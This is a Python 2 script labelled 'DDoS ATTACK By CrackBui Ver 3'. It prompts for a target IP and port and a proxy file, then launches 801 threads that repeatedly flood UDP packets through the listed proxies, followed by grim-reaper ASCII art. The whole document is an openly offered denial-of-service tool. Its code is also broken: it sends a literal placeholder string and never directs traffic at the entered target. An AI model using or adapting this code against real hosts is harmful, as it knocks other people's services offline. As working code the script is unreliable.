#---DDOS ATTACK BY CRACK BUI---
 
import random
import socket
import threading
from threading import Thread
import time
import sys
from random import randrange
from threading import Lock
import datetime
import re
import urllib2
import urllib
socket.setdefaulttimeout(1)




 



 


 
class BTB(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')

        
        ddos = "(bytes, (ip, port))" + "\r\n"
 
        while nload:
            time.sleep(0.5)
           
        while 1:
            try:
                bytes = random._urandom(65500)
                btb = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                btb.connect((proxy[0], int(proxy[1])))
                btb.send(ddos)
                try:
                    for i in xrange(999):
                        btb.send(ddos)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')


 
 
# gioi thieu
print \
"""-----------DDoS ATTACK By CrackBui Ver 3-----------"""
print '---------------------------------------------------'
#IP
ip = raw_input("IP/Website: ")
port = input("Port: ")




#Proxy
in_file = open(raw_input("File proxy(proxy.txt): "),"r")
proxyf = in_file.read()
in_file.close()
 
listaproxy = proxyf.split('\n')
 

 


 

 
 

nload = 1
 

x = 0
 






for x in xrange(801):
    BTB().start()
    time.sleep(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
    print "Power =  " + str(x) + "!"
   
print \
"""
                   ...
                 ;::::;   
               ;::::; :;    
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;          
           ::::::;       ;          
           ;:::::;       ;          OOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#"""
nload = 0
 

while not nload:
    time.sleep(1)

